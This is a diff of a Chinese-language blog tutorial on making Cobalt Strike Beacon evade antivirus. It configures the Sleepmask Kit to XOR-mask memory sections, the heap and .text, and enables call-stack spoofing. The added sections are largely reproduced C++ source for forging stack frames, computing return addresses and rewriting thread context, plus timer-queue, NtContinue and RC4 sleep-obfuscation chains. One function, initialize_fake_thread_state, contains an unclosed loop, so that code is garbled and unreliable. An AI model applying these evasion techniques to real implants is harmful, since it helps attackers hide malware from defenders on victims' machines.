@@ -28,7 +28,7 @@ Set sleep_mask "true"
 
 ![img](利用CS的Profile文件实现免杀/Screenshot-from-2023-05-05-16-16-45.png)	
 
-
+​	
 
 ## 加载artifact_kit启用堆栈欺骗
 
@@ -76,21 +76,23 @@ arsenal_kit.config配置完后，运行build_arsenal_kit.sh进行编译, 随后�
 
 
 
-## 修改sleepmask_kit
+## 配置sleepmask_kit
+
+### 遮掩内存区段、堆内存
 
 Sleepmask机制通过CobaltStrike的Sleepmask Kit实现，该Kit提供了一套源代码，使用户能够自定义遮掩过程。在默认配置下，Sleepmask Kit提供了基本的异或遮掩，但用户可以根据需要修改这些源代码，以实现更复杂或不同的遮掩算法
 
 作者强调了哪些代码不能被修改，比如不允许修改MASK_SIZE值，因为这是用于指定mask大小的参数，更改可能会导致Beacon无法正常运行
 
-在sleepmask.c有一个sleep_mask函数，该函数通过调用`mask_sections`和`mask_heap`函数来加密Beacon的内存区段和堆内存，而两个函数在common_mask.c中实现
+在sleepmask.c有一个`sleep_mask`函数，该函数通过调用`mask_sections`和`mask_heap`函数来加密Beacon的内存区段和堆内存，而两个函数在`common_mask.c`中实现
 
-![image-20231018111636772](浅谈CS的sleepmask_kit/image-20231018111636772.png)
+![image-20231115154937068](利用CS的Profile文件实现免杀/image-20231115154937068.png)	
 
 
 
-mask_sections函数通过遍历`SLEEPMASKP`结构中的区段数组, 对每个区段调用`mask_section`函数来实现加密或解密操作
+`mask_sections`函数通过遍历`SLEEPMASKP`结构中的区段数组, 对每个区段调用`mask_section`函数来实现加密或解密操作
 
-mask_section函数用于xor加密或解密一个特定的内存区段，它接受三个参数：一个`SLEEPMASKP`指针和两个指定内存区段起始和结束位置的值
+`mask_section`函数用于xor加密或解密一个特定的内存区段，它接受三个参数：一个`SLEEPMASKP`指针和两个指定内存区段起始和结束位置的值
 
 ```cpp
 /* Mask a beacon section
@@ -166,6 +168,302 @@ void mask_section(SLEEPMASKP * parms, DWORD a, DWORD b) {
    }
 }
 ```
+
+
+
+### 修改text节属性
+
+首先使用`setup_text_section`函数确定Beacon中`.text`节的位置，然后根据Profile文件配置中`stage.userwx`设置来决定是否掩码`.text`节，`text.mask`被设为`1`表示`.text`节应该被掩码
+
+<img src="利用CS的Profile文件实现免杀/image-20231116103810686.png" alt="image-20231116103810686" style="zoom:67%;" />	
+
+​		
+
+接下来使用`mask_text_section`和`unmask_text_section`函数来修改`.text节`的属性
+
+<img src="利用CS的Profile文件实现免杀/image-20231116105104131.png" alt="image-20231116105104131" style="zoom:80%;" />
+
+​			
+
+### 堆栈欺骗
+
+在`sleepmask.c`中，将`EVASIVE_SLEEP`设置为`1`，`EVASIVE_SLEEP`与传统Sleep函数不同的是, 它会在睡眠期间对内存中实现sleepmask功能的代码数据进行遮掩
+
+![image-20231110194124201](利用CS的Profile文件实现免杀/image-20231110194124201.png)
+
+
+
+这里我们将`evasive_sleep.c`注释掉, 使用`evasive_sleep_stack_spoof.c`来启用堆栈欺骗功能
+
+![image-20231110194132925](利用CS的Profile文件实现免杀/image-20231110194132925.png)	
+
+
+
+接下来我将讲解堆栈欺骗在`evasive_sleep_stack_spoof.c`中的实施过程，首先定义了一个`STACK_FRAME`结构，用来存储每个伪造的堆栈帧的详细信息，比如目标DLL名称、函数哈希、偏移量、返回地址等等
+
+> 堆栈帧：其实就是栈中的一个“层”，每个函数调用都会在调用堆栈上“push”一个新的堆栈帧，并在函数返回时“pop”这个堆栈帧
+
+```cpp
+typedef struct _STACK_FRAME {
+    WCHAR targetDll[MAX_PATH];
+    DWORD functionHash;
+    ULONG offset;
+    ULONG totalStackSize;
+    BOOL requiresLoadLibrary;
+    BOOL setsFramePointer;
+    PVOID returnAddress;
+    BOOL pushRbp;
+    ULONG countOfCodes;
+    BOOL pushRbpIndex;
+} STACK_FRAME, *PSTACK_FRAME;
+```
+
+
+
+然后通过 `set_frame_info` 函数，可以为每个欲模拟的堆栈帧设置这些详细信息
+
+```cpp
+void set_frame_info(
+    OUT PSTACK_FRAME frame,
+    IN LPWSTR path,
+    IN DWORD api_hash,
+    IN ULONG target_offset,
+    IN ULONG target_stack_size,
+    IN BOOL dll_load)
+{
+    memset(frame, 0, sizeof(STACK_FRAME));
+    lstrcpyW(frame->targetDll, path) ;
+    frame->functionHash = api_hash;
+    frame->offset = target_offset;
+    frame->totalStackSize = target_stack_size;
+    frame->requiresLoadLibrary = dll_load;
+    frame->setsFramePointer = FALSE;
+    frame->returnAddress = 0;
+    frame->pushRbp = FALSE;
+    frame->countOfCodes = 0;
+    frame->pushRbpIndex = 0;
+}
+```
+
+
+
+`set_callstack` 函数用于构建一个完整的欲模拟堆栈。这个堆栈由多个 `STACK_FRAME` 结构组成，每个结构代表堆栈中的一个帧
+
+每个帧都被赋予特定的DLL名称和函数偏移量，这是为了在堆栈欺骗中模拟一个真实的调用堆栈，注释里提到可以使用类似ProcessHacker的工具在Windows目标系统上找到想要伪造的堆栈
+
+此处需要注意的是，即使是相同的函数，在不同版本的系统上其在内存中的位置都可能不同
+
+```cpp
+void set_callstack(
+    IN PSTACK_FRAME callstack,
+    OUT PDWORD number_of_frames)
+{
+    DWORD i = 0;
+
+    /*
+     *  How to choose your call stack to spoof.
+     *  Steps:
+     *     1. Use process hacker or similar utility on a representative
+     *        Windows target system to find a stack you want to spoof.
+     *        Note: Different versions of windows may have different offsets.
+     *     2. Use the module, function and offset information as input
+     *        to the getFunctionOffset utility located in arsenal-kit/utils.
+     *     3. The getFunctionOffset utility outputs information including
+     *        the code to use in this function.
+     *  Note: Should look for a stack with NtWaitForSingleObject at the top.
+     *        Then use the information for the remaining stack frames.
+     *  Note: The module extension is optional.
+     *
+     *  Using the getFunctionOffset helper utility to generate the code.
+     *     getFunctionOffset.exe ntdll.dll TpReleasePool 0x402
+     *     getFunctionOffset.exe kernel32.dll BaseThreadInitThunk 0x14
+     *     getFunctionOffset.exe ntdll RtlUserThreadStart 0x21
+     *
+     *  Note: The number of frames can not exceed the MAX_FRAME_NUM value.
+     */
+    set_frame_info(&callstack[i++], L"ntdll.dll", 0, 0x550b2, 0, FALSE);
+    set_frame_info(&callstack[i++], L"kernel32.dll", 0, 0x174b4, 0, FALSE);
+    set_frame_info(&callstack[i++], L"ntdll", 0, 0x526a1, 0, FALSE);
+
+    *number_of_frames = i;
+}
+```
+
+
+
+使用ProcessHacker随便查看一个进程的线程堆栈, 例如此处我要模拟RtlUserThreadStart函数，其模块名和偏移量分别为`ntdll`和`0x28`
+
+> 在操作系统中，每个线程都有特定的堆栈。堆栈是一个用于记录函数调用历史的数据结构，它存储了线程在执行过程中的函数调用顺序以及每次函数调用时的局部变量、参数和返回地址等信息
+
+![image-20231111111503166](利用CS的Profile文件实现免杀/image-20231111111503166.png)	
+
+
+
+然后转到`arsenal-kit\utils\getFunctionOffset`目录，使用编译的`getFunctionOffset.exe`生成具体的代码示例。此处生成的代码示例为：`set_frame_info(&callstack[i++], L"ntdll.dll", 0, 0x5aa78, 0, FALSE);`
+
+![image-20231111115553496](利用CS的Profile文件实现免杀/image-20231111115553496.png)
+
+
+
+使用`calculate_return_address`函数来计算每个伪造堆栈帧的返回地址。这是通过 `GetModuleHandleW` 或 `LoadLibraryW` 获取目标DLL的基地址，然后加上偏移量来完成的
+
+```cpp
+BOOL calculate_return_address(
+    IN OUT PSTACK_FRAME frame)
+{
+    PVOID image_base = NULL;
+
+    // get library base address
+    image_base = GetModuleHandleW(frame->targetDll);
+    if (!image_base)
+        image_base = LoadLibraryW(frame->targetDll);
+    if (!image_base)
+    {
+        return FALSE;
+    }
+
+    // set the return address as image_base + offset
+    frame->returnAddress = RVA(PVOID, image_base, frame->offset);
+
+    return TRUE;
+}
+```
+
+
+
+使用`calculate_function_stack_size`计算出每个函数(堆栈帧)占用的堆栈空间，这对于伪造的堆栈在解除堆栈的过程中能够正确执行很重要，以免导致程序崩溃或检测到异常行为
+
+```cpp
+BOOL calculate_function_stack_size(
+    IN OUT PSTACK_FRAME frame)
+{
+    DWORD64 ImageBase = 0;
+    PUNWIND_HISTORY_TABLE pHistoryTable = NULL;
+    PRUNTIME_FUNCTION pRuntimeFunction = NULL;
+    // [1] Locate RUNTIME_FUNCTION for given function.
+    pRuntimeFunction = RtlLookupFunctionEntry(
+        (DWORD64)frame->returnAddress,
+        &ImageBase,
+        pHistoryTable);
+    if (!pRuntimeFunction)
+    {
+        return FALSE;
+    }
+
+    /*
+     * [2] Recursively calculate the total stack size for
+     * the function we are "returning" to
+     */
+    return calculate_function_stack_size_internal(
+        frame,
+        pRuntimeFunction,
+        ImageBase);
+}
+```
+
+
+
+使用`initialize_spoofed_callstack`函数初始化整个伪造的调用堆栈，此过程包含加载必要的Dll、计算函数的返回地址和堆栈空间大小
+
+```cpp
+BOOL initialize_spoofed_callstack(
+    PSTACK_FRAME callstack,
+    DWORD number_of_frames)
+{
+    PSTACK_FRAME frame = NULL;
+
+    for (DWORD i = 0; i < number_of_frames; i++)
+    {
+        frame = &callstack[i];
+
+        // [1] Calculate ret address for current stack frame.
+        if (!calculate_return_address(frame))
+        {
+            return FALSE;
+        }
+
+        // [2] Calculate the total stack size for ret function.
+        if (!calculate_function_stack_size(frame))
+        {
+            return FALSE;
+        }
+    }
+
+    return TRUE;
+}
+```
+
+
+
+使用`initialize_fake_thread_state`函数修改线程的上下文来实现堆栈欺骗，此函数会遍历伪造的堆栈，并将每个堆栈帧的信息推入线程的实际堆栈中
+
+```cpp
+void initialize_fake_thread_state(
+    PSTACK_FRAME callstack,
+    DWORD number_of_frames,
+    PCONTEXT context)
+{
+    ULONG64 childSp = 0;
+    BOOL bPreviousFrameSetUWOP_SET_FPREG = FALSE;
+    PSTACK_FRAME stackFrame = NULL;
+
+    push_to_stack(context, 0);
+
+    for (DWORD i = 0; i < number_of_frames; i++)
+    {
+        stackFrame = &callstack[number_of_frames - i - 1];
+
+        if (bPreviousFrameSetUWOP_SET_FPREG && stackFrame->pushRbp)
+        {   
+         
+            DWORD diff = stackFrame->countOfCodes - stackFrame->pushRbpIndex;
+            DWORD tmpStackSizeCounter = 0;
+            for (ULONG j = 0; j < diff; j++)
+            {
+            
+
+            context->Rsp -= (stackFrame->totalStackSize - (tmpStackSizeCounter + 0x8));
+            *(PULONG64)(context->Rsp) = (ULONG64)stackFrame->returnAddress;
+
+
+            bPreviousFrameSetUWOP_SET_FPREG = FALSE;
+        }
+        else
+        {
+        
+            context->Rsp -= stackFrame->totalStackSize;
+            *(PULONG64)(context->Rsp) = (ULONG64)stackFrame->returnAddress;
+        }
+        
+        if (stackFrame->setsFramePointer)
+        {
+            childSp = context->Rsp;
+            childSp += 0x8;
+            bPreviousFrameSetUWOP_SET_FPREG = TRUE;
+        }
+    }
+}
+```
+
+
+
+最后使用`CreateTimerQueueTimer`函数创建多个计时器队列定时器，为了是在不同的时间间隔执行特定的回调函数。例如，一开始会执行`spoof_stack`函数进行堆栈欺骗，过了一段时间后再恢复堆栈状态
+
+![image-20231114201903386](利用CS的Profile文件实现免杀/image-20231114201903386.png)
+
+
+
+这里我要提及一下`NtContinue`函数，其主要功能是恢复线程的上下文，其参数指向一个`CONTEXT`结构体的指针，该结构体包含线程的寄存器和其他信息
+
+在`evasive_sleep`函数中，它通过创建一系列的计时器，这些计时器在触发时使用`NtContinue`函数来将控制权转移到先前准备好的`CONTEXT` 结构中指定的地址，这些`CONTEXT` 结构被设置为指向如 `VirtualProtect` 等函数的地址
+
+此处还用到了`SystemFunction032`函数，该函数实现了RC4加密算法，可同时用于加密和解密，接收数据和密钥结构作为参数，配合`VirtualProtect`来实现对sleepmask代码进行加解密。
+
+<img src="利用CS的Profile文件实现免杀/image-20231115105747075.png" alt="image-20231115105747075" style="zoom:80%;" />	
+
+上述这些操作使用到了与ROP相似的思路，ROP（Return-Oriented Programming，返回导向编程）技术是一种利用已存在于程序内存中的代码片段来绕过执行流程控制和安全措施的技巧。这些代码片段通常以“gadgets”（小工具）的形式存在，它们是程序已有代码中的小片段，以返回指令结束
+
+在evasive_sleep函数中，通过控制堆栈上的返回地址，使之指向这些Gadgets(Windows Api)，这些gadgets最终形成了攻击者的payload，从而在没有新代码注入的情况下执行恶意操作
 
 
 
@@ -274,7 +572,7 @@ int main() {
 
 以下是堆栈加密前和加密后的对比图：
 
-![image-20231017231817521](利用CS的Profile文件实现免杀/image-20231017231817521.png)	
+![image-20231017231817521](利用CS的Profile文件实现免杀/image-20231017231817521.png)
 
 
 
